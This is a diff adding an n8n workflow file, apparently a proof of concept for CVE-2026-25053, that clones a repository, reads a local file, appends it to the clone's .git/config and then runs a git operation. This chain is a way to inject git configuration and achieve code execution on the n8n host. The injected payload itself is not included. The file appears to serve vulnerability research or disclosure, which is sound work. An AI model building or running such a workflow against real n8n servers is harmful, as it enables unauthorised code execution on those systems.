@@ -1,0 +1,135 @@
+{
+  "name": "My workflow",
+  "nodes": [
+    {
+      "parameters": {},
+      "type": "n8n-nodes-base.manualTrigger",
+      "typeVersion": 1,
+      "position": [
+        0,
+        0
+      ],
+      "id": "4788ad09-5334-44be-bc54-8f64d657020e",
+      "name": "When clicking ‘Execute workflow’"
+    },
+    {
+      "parameters": {
+        "operation": "clone",
+        "repositoryPath": "C:\\Users\\yadhu\\.n8n-files\\poc",
+        "sourceRepository": "https://github.com/yadhukrishnam/CVE-2026-25053"
+      },
+      "type": "n8n-nodes-base.git",
+      "typeVersion": 1.1,
+      "position": [
+        208,
+        0
+      ],
+      "id": "e7d0fe23-29bb-4baf-b89c-9998a9843ff8",
+      "name": "Git"
+    },
+    {
+      "parameters": {
+        "fileSelector": "C:\\Users\\yadhu\\.n8n-files\\test\\file.txt",
+        "options": {}
+      },
+      "type": "n8n-nodes-base.readWriteFile",
+      "typeVersion": 1.1,
+      "position": [
+        416,
+        0
+      ],
+      "id": "952fe157-667f-40f2-bee8-16d2ad865319",
+      "name": "Read/Write Files from Disk"
+    },
+    {
+      "parameters": {
+        "operation": "write",
+        "fileName": "C:\\Users\\yadhu\\.n8n-files\\poc\\.git\\config",
+        "options": {
+          "append": true
+        }
+      },
+      "type": "n8n-nodes-base.readWriteFile",
+      "typeVersion": 1.1,
+      "position": [
+        624,
+        0
+      ],
+      "id": "8f1de22e-ad5e-4d54-8bd7-ac5a1cbb4ba7",
+      "name": "Read/Write Files from Disk1"
+    },
+    {
+      "parameters": {
+        "operation": "add",
+        "repositoryPath": "C:\\Users\\yadhu\\.n8n-files\\poc\\",
+        "pathsToAdd": "file.txt"
+      },
+      "type": "n8n-nodes-base.git",
+      "typeVersion": 1.1,
+      "position": [
+        832,
+        0
+      ],
+      "id": "a74e8e25-4061-496f-b35f-c9ab6e7999bd",
+      "name": "Git1"
+    }
+  ],
+  "pinData": {},
+  "connections": {
+    "When clicking ‘Execute workflow’": {
+      "main": [
+        [
+          {
+            "node": "Git",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Git": {
+      "main": [
+        [
+          {
+            "node": "Read/Write Files from Disk",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Read/Write Files from Disk": {
+      "main": [
+        [
+          {
+            "node": "Read/Write Files from Disk1",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Read/Write Files from Disk1": {
+      "main": [
+        [
+          {
+            "node": "Git1",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "active": false,
+  "settings": {
+    "executionOrder": "v1",
+    "availableInMCP": false
+  },
+  "versionId": "ba3d4d13-f410-4602-acd6-d49ddf418263",
+  "meta": {
+    "instanceId": "b8bea29457612dad104cf508ac3fc50ec7875f189f3a1152af8b0f32fda315ef"
+  },
+  "id": "BhDEuUP3YXm2LvKt",
+  "tags": []
+}
